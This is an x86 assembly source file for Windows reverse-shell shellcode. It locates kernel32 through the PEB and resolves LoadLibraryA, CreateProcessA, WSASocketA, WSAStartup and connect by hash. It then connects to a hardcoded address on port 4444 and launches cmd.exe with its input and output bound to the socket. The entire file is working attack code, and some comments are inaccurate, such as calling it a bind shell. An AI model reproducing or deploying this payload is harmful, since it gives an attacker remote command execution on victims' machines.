[BITS 32]

global _start

_start:

; GetPC
FLDZ			;get PC 1
FSTENV [esp-0xC]	;get PC 2

;relative jump to main
xor edx,edx		;zero out edx
;mov dl,0x7a		;offset to main

;skylined generic find Kernel32 technique
	xor ecx,ecx		; ecx = 0
	mov esi,[fs:ecx+0x30]	; esi = &(PEB) ([fs:ecx+0x30])
	mov esi,[esi+0xc]	; esi = PEB->ldr
	mov esi,[esi+0x1c]	; esi = PEB->ldr.InInitOrder
next_module:
	mov eax,[esi+0x08]	; eax = InInitOrder[x].base_address
	mov edi,[esi+0x20]	; edi  = InInitOrder[x].module_name (unicode)
	mov esi,[esi]		; esi = InInitOrder[x].flink	(next Module)
	cmp [EDI + 12*2],cl	; compare the 12th cahracter of data pointed to by edi with 0 
	jnz next_module

;relative jump to main
;pop ecx				; pop value into ecx
;add ecx,edx			; add the offset to main to it
jmp main				; jmp to main
;========Find Function=======;
find_function:
	pushad			; save all register on stack
	mov ebp,edx		; put function base address save at edi in ebp
	
	mov eax,[ebp+0x3c]	; jump over PE header
	mov edi, [ ebp + eax + 0x78]	; Export table relative offset
	add edi,ebp		; edi = absolute address of export table by adding the dll base address to it abs  = rva + base addr
	mov ecx,[edi+0x18]	; ecx = Number of names in Export Table
	mov ebx,[edi+0x20]	; ebx = Names table relative offset
	add ebx,ebp		; ebx = absolute address of Names table 

find_function_loop:
	jecxz find_function_finished	;if ecx =0 all symbols checked jump to end of find function
	dec ecx				; ecx = ecx - 1 ecx contatins the number of names
	mov esi,[ebx + ecx * 4]		; esi = (RVA) relative offset of name
	add esi,ebp			; esi  = absolute address of name

compute_hash:
	xor eax,eax			; zero out eax to hold bytes
	cdq				; zero out edx to be hash accumulator
	cld				; clear direction flags to increase when executing lods* instruction

compute_hash_again:
	lodsb				; load bytes at esi (current symbol name) into al
	test al,al			; bit wise test to see if al is equal zero ( End Of String)
	jz find_function_compare	; if ZF is set, we reached the end of string
	ror edx,0x0d			; rotate edx 13 bits to the right
	add edx,eax			; add the new byte to the accumulator
	jmp compute_hash_again		; next iteration

find_function_compare:
	cmp edx,[esp+0x28]		; compare computed hash locate at edx to reuested hash which was on stack before the pushad and saved at esp+0x20
	jnz find_function_loop		; if no match then jump get the next name
	mov ebx,[edi+0x24]		; ebx = ordinals table RVA
	add ebx,ebp			; ebx = absolute address of ordinal table
	mov cx,[ ebx + 2 * ecx]		; cx  = adress or ordinal table + 2 * Current index of name = current function ordinal
	mov ebx,[edi+0x1c]		; ebx = address table rva
	add ebx,ebp			; ebp = address table absolute address
	mov eax,[ebx + 4 * ecx]		; eax = RVA address table + current index of function = address of functino
	add eax,ebp			; eax = asolute address of function (name)
	mov [esp+0x1c],eax		; overwrite stack version of eax from pushad with the address of the function
	
find_function_finished:
	popad				; restore all registers
	ret				; return to caller

main:
;for Bind Shell We Need the following function
;Kernel32.dll functions
;LoadLibraryA		0xec0e4e8e
;CreateProcessA		0x16B3FE72
;Exitprocess		0x73E2D87E

;ws2_32.dll Functions
;WSASocketA			0xADF509D9
;WSAStartup			0xCBEDFC3B
;connect			0xECF9AA60

mov dl,0x60			; extend space on stack for functions
sub esp,edx			
mov ebp,esp			; set ebp to become frame pointer
mov edx,eax			; mov kernel32.dll baseaddress to edx

;LoadLibrary
	push 0xec0e4e8e		; push load library hash
	push edx		; push kernel32.base_address
	call find_function
	mov [ebp+0x04],eax		; loadlibraryA() 
; CreateProcess
	push 0x16B3FE72		; push CreateProcessA hash
	push edx	
	call find_function
	mov [ebp+0x08],eax	;CreateProcessA()
;ExitProcess
	push 0x73E2D87E		;Exitprocess
	push edx
	call find_function
	mov [ebp+0x0c],eax	; ExitProcess()	
; get ws2-32.dll base addr
; get functions in ws2_32.dll
;ws2_32.dll		77 73 32 5f 33 32 2e 64 6c 6c
xor eax,eax
push 0xff206c6c		; push ws2_32.dll
push 0x642e3233		; to stack
push 0x5f327377
mov [esp+0xA],al	; replace 10th character with NULL
push esp			; push stack
call [ebp+0x04]		; call LoadLibraryA(user32.dll)
mov edx,eax			; mov pointer to ws2_32.dll to edx
;WSASocketA	0xD909F5AD
push 0xADF509D9
push edx
call find_function
mov [ebp+0x10],eax	;WSASocketA
;WSAStartup                     0xCBEDFC3B
push 0x3BFCEDCB		; push WSAStartup hash on stack
push edx		; push ws2_32.dll base address on stack
call find_function
mov [ebp+0x14],eax	;WSAStartup
;
;connect                        0xECF9AA60
push 0x60AAF9EC
push edx
call find_function
mov [ebp+0x18],eax		;connect
;
;initialize cmd on stack
mov eax,0x646d6301	; mov "cmd01" to eax
sar eax,0x08		; shift right 8 bits to get NULL at end of cmd
push eax		; push cmd on stack
mov [ebp+0x2c],esp	; save pointer to cmd in ebp+0x20
;initalize WSAStratup
xor edx,edx
mov dh,0x03		; szie of WSADATA is 0x300
sub esp,edx		; save place on stack for WSADATA

xor ecx,ecx
inc ecx
inc ecx
push esp		; use stack for WSDATA
push ecx		; wversionrequest = 2
call [ebp+0x14]		; call WSAStartup
add esp,0x0300		; return(align) stack to original place 

;WSASocket(int af,itn type,int protocol, lpprotocolinfo,group g,DWORD dwflags)
;WSASocket(2,1,0,0,0,0)
xor eax,eax
push eax		;dwflags = 0
push eax 		; group g  = 0
push eax		; lpprotocolinfo = 0
push eax		; protocol = 0
inc eax			; type = 1 = SOCK_STREAM
push eax
inc eax			; eax = 2
push eax		; ad = 2 = AF_INET
call [ebp+0x10]	 	; call WSASocketA
mov esi,eax		; move socket file descriptor from eax to esi
;Connect(socket s,struct sockaddr *name, namelen)
;Connect(esi,struct *sockaddr_in,lenght)
;initalize struct sockaddr_in
;sockaddr_in{sin_family,sin_port,struct in addr sin_addr,sin_zero}
xor eax,eax
push eax		; sin_zero = 0
push 0x8098A8C0 	; push address in network bytes format for struct in_addr (192.168.152.128)
mov eax,0x5c110102	; put the port in networkbytes format in eax 4444 = 5c11 the extra 0102 will be decresed to become 0002 the sinfamily since the size is word of sin-family and sin_port
dec ah			;decresed the 0102 as explained above
push eax		; push the sin_port and sin_family
mov ebx,esp		; put the pointer to struct on stack to ebx
;struct end
xor eax,eax
mov al,0x10		; let eax = 0x10 which 16 decimal - size of struct 
push eax		; push value of namelen 0x10
push ebx		; push struct sockaddr_in
push esi		; push socke file descriptor returned by WSASocketA
call [ebp+0x18]		; call connect()

;CreateProcess(lpapplicationname,lpcommandline,lpprocessattributes,lpthreadattributes,binherithandles,dwcreateionflags,lpcurrentdirectory,struct lpstartupinfo, struct lp process information)
;struct STARTUPINFO{cb,lpreserved,lpdesktop,lptitle,dwx,dwy,dwxsize,dwysize,dwxcountchars,dwycountchars,dwfillattribute,dwflages,wshowwindow,cbreserved2,lpreserved2,hstdInput,hStdOutput,hStdError}
;struct PROCESSINFORMATION{hProcess,hThread,dwProcessId,dwThreadId}
;structs initalization

xor ecx,ecx
mov cl,0x54		; ecx holds size of STARTINFO & PROCESSINFO structs and will act as counter for stosb
sub esp,ecx		; save space for structs on stack
mov edi,esp		; edi holds pointer to struct on stack
push edi		; save edi value on stack since the coming instructions will alter it 
xor eax,eax		; zero out eax
rep stosb		; store each byte in edi with the value in eax untill ecx is zero
pop edi			; restore edi orginal value
; struct intialization end
; struct STARTUPINFO data insertion
mov byte [edi],0x44	; sets cb attribute to 0x44
inc byte [edi+0x2D]	; increase byte at edi+0x38 to 1 to set dwFlags attribute to STAT_USESTDHANDLE tp indicate the hStd handles will be used
push edi		; save original value of edi
mov eax,esi		; move the socket file descriptor to eax returned by WSASocket
lea edi,[edi+0x38]	; load the address of the hStdInput in edi
stosd			; hStdInput = socket file descriptor
stosd			; store the dword value locate at eax to address pointed to by  edi hStdOutput
stosd			; hStdError = socket file descriptor
pop edi			; restore original value of edi
;struct STARTUPINFO end
lea esi,[edi+0x44]	; load effective address of PROCESSINFORMATION into esi
;CreateProcess(lpapplicationname,lpcommandline,lpprocessattributes,lpthreadattributes,binherithandles,dwcreateionflags,lpcurrentdirectory,struct lpstartupinfo, struct lp process information)
xor eax,eax		; zero out eax 
push esi		; push the pointer to the PROCESSINFORMATION struct to lpProcessInformation attribute
push edi		; push the pointer to the STARTUPINFORMATION struct to lpStartupinfo attribute  
push eax		; set lpstartupdirectory to NULL
push eax		; set the lpEnviroment to NULL
push eax		; set the dwcreationflag to 0
inc eax			; eax = 1
push eax		; set bInheritHandles argument to TRUE since client need to inherit the socket file descriptor
dec eax			; eax = 0
push eax		; set lpthreadAttributes argument as NULL
push eax 		; set lpProcessAttributes argument as NULL
push DWORD [ebp+0x2c]		; set the lpcommandline argument to cmd saved at [ebp+0x2c]
push eax		; set lpApplicationName argument to NULL
call [ebp+0x8]		; call createprocess